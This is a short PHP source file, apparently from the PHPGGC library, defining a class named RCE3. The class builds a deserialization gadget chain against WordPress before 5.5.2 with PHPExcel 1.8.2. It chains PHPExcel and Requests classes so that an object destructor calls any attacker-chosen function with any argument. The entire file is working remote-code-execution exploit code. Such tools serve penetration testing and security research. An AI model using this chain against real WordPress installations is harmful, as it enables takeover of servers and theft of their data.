<?php

namespace GadgetChain\WordPress\PHPExcel;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.8.2+ & WP < 5.5.2';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $information = 'Tested up to WP 5.0.11 and PHPExcel 1.8.2';
    
    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \PHPExcel_CachedObjectStorage_DiscISAM(
            new \PHPExcel_RichText(
                new \Requests_Utility_FilteredIterator([$parameter], $function)
            )
        );
    }
}